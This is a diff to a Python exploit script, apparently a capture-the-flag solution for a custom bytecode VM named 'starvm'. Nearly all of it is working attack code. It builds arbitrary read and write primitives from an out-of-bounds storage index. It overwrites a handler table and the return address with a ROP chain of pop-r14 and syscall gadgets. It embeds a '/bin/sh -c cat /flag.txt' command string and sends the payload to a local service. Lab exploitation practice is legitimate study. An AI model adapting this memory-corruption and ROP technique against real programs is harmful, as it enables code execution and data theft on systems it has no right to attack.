@@ -23,14 +23,54 @@ func3 = bytes(func3_raw)
 
 MAGIC_BEEF = 0xdeadbeefdeadbeef
 MAGIC_CAFE = 0xc00ffee0c00ffee0
-ADDR1 = 0xae6b877f7436be69
+
+HANDLER_TABLE_BASE = 0x7fffffffaf20
+STORAGE_BASE = 0x7ffffffeaef0
+RET_ADDR = 0x7ffffffd9ea8 + 0x08 # hopefully they're all same based
+POPR14_ADDR = 0x0000000001025165
+RSI_RESET_ADDR = 0x0000000001038aca
+SYSCALL_ADDR = 0x000000000100f51b
+
 
 def print_stack_length():
     # print stack length? 
     # store + 9, read + 1
     return p8(0x01)
 
-def store_to_stack():
+def read_to_stack():
+    """
+    read from stdin to stack in hex (max 16 characters) 
+    stack[-1] = bytes.fromhex(input())
+    """
+    return p8(0x60)
+
+def load_to_stack(value, signed=False):
+    """
+    load immediate value to stack in bytes 
+    stack.push(<8-byte>)
+    usage: 0x10 <8-byte> 
+    """
+    b = b""
+    b += p8(0x10)  # LOAD
+    b += p64(value, signed=signed) 
+    return b 
+
+def pop_stack():
+    """
+    pop top stack value 
+    stack.pop()
+    """
+    return p8(0x11)
+
+def dup_stack(pos):
+    """
+    duplicate stack value at position pos (0-indexed from top)
+    stack.push(stack[-(pos+1)])
+    usage: 0x12 <pos>
+    """
+    return p8(0x12) + p8(pos)
+
+def stack_to_storage():
     """
     0x000000000102f615 around
     mov    rsi, qword ptr [rax + rdi*8 + 0x8008]
@@ -43,34 +83,7 @@ def store_to_stack():
     rsi = second top-most qword
     -> storage[stack[-1]] = stack[-2]
     """
-    return p8(0x13) 
-
-
-def read_to_stack():
-    """
-    read from stdin to stack in hex (max 16 characters) 
-    stack[-1] = bytes.fromhex(input())
-    """
-    return p8(0x60)
-
-def load_to_stack(value):
-    """
-    load immediate value to stack in bytes 
-    stack.push(<8-byte>)
-    usage: 0x10 <8-byte> 
-    """
-    b = b""
-    b += p8(0x10)  # LOAD
-    b += p64(value) 
-    return b 
-
-def dup_stack(pos):
-    """
-    duplicate stack value at position pos (0-indexed from top)
-    stack.push(stack[-(pos+1)])
-    usage: 0x12 <pos>
-    """
-    return p8(0x12) + p8(pos)
+    return p8(0x13)
 
 def read_from_storage():
     """
@@ -80,6 +93,24 @@ def read_from_storage():
     """
     return p8(0x14)
 
+def add_stack():
+    """
+    add top two stack values 
+    a = stack.pop()
+    b = stack.peek()
+    stack.push(a + b)
+    """
+    return p8(0x20)
+
+def or_stack():
+    """
+    or top two stack values 
+    a = stack.pop()
+    b = stack.peek()
+    stack.push(a | b)
+    """
+    return p8(0x31)
+
 def xor_stack():
     """
     xor top two stack values 
@@ -88,6 +119,23 @@ def xor_stack():
     stack.push(a ^ b)
     """
     return p8(0x32)
+
+def sub_stack():
+    """
+    sub top two stack values 
+    a = stack.pop()
+    b = stack.peek()
+    stack.push(a - b)
+    """
+    return p8(0x40)
+
+def jump_by_offset(offset):
+    """
+    jump by offset 
+    PC += offset
+    usage: 0x43 <offset>
+    """
+    return p8(0x43) + p8(offset)
 
 """
 common pattern
@@ -108,12 +156,36 @@ def call_function(index):
     return load_to_stack(index) + p8(0x50)
 
 
+def write_at(addr, val):
+    """
+    write val at addr 
+    """
+    b = b""
+    overflow_index = (addr - STORAGE_BASE) // 8
+    b += load_to_stack(val)
+    b += load_to_stack(overflow_index, signed=True)
+    b += stack_to_storage()
+    return b
+
+def read_at(addr):
+    """
+    read from addr to stack 
+    """
+    b = b""
+    overflow_index = (addr - STORAGE_BASE) // 8
+    b += load_to_stack(overflow_index, signed=True)
+    b += read_from_storage()
+    return b
+
 program = b""
-program += call_function(1)
-program += load_to_stack(0x00)
-program += load_to_stack(0x14)
-program += call_function(2)
-program += p8(0x0)
+program += write_at(HANDLER_TABLE_BASE + 59 * 8, POPR14_ADDR)  
+program += write_at(RET_ADDR, 0)
+program += write_at(RET_ADDR + 8, POPR14_ADDR)  
+program += write_at(RET_ADDR + 16, SYSCALL_ADDR)  # r14
+program += write_at(RET_ADDR + 24, 0x7fffffffd8d0)  # rbp, filler
+program += write_at(RET_ADDR + 32, RSI_RESET_ADDR)  # ret to rsi = r8
+# program += write_at(RET_ADDR - 8, SYSCALL_ADDR)  # actual ret addr overwrite the last
+program += p8(59)
 len_main = len(program)
 
 # Payload construction
@@ -121,10 +193,10 @@ with open('payload', 'wb') as f:
     f.write(b"STARP")
 
     # function
-    f.write(p32(3))
+    f.write(p32(1))
     f.write(p32(0))
-    f.write(p32(len_main))
-    f.write(p32(len_main + len(func2)))
+    #f.write(p32(len_main))
+    #f.write(p32(len_main + len(func2)))
 
     # storage
     """
@@ -142,23 +214,31 @@ with open('payload', 'wb') as f:
     f.write(p64(0x56a79dcdf1f10c1b))
     f.write(p64(0x4debb7af544e26ac))
     """
-    f.write(p32(12))
-    for i in range(12):
-        f.write(p64(MAGIC_CAFE + i))
-
+    f.write(p32(4))
+    # put /bin/sh in storage[0]
+    # f.write(p64(0x00696d616f6877))
+    # f.write(p64(0x0061206863756f74))
+    f.write(p64(0x2068732f6e69622f))  # "/bin/sh "
+    f.write(p64(0x207461632720632d))  # "-c 'cat "
+    f.write(p64(0x78742e67616c662f))  # " /flag.t"
+    f.write(p64(0x00002732263e2074))  # "xt >&2  "
+    
     # program
-    program += func2
-    program += func3
     f.write(p32(len(program)))
     f.write(program)
     print(program)
     f.flush()
-    
-    if args.run:
-        result = subprocess.run(["./starvm", f.name], capture_output=True)
-        print(f"output:\n{result.stderr.decode()}")
+  
+if args.run or args.delete:
+    with open('payload', 'rb') as f:
+        if args.run:
+            p = remote('localhost', 10302)
+            file_bytes = f.read()
+            p.sendlineafter(b'size > ', str(len(file_bytes)).encode())
+            p.send(file_bytes)
+            print(p.recv(10))
 
-    if args.delete:
-        os.remove(f.name)
-    else:
-        print(f"Temporary file kept at: {f.name}")
+        if args.delete:
+            os.remove(f.name)
+        else:
+            print(f"Temporary file kept at: {f.name}")
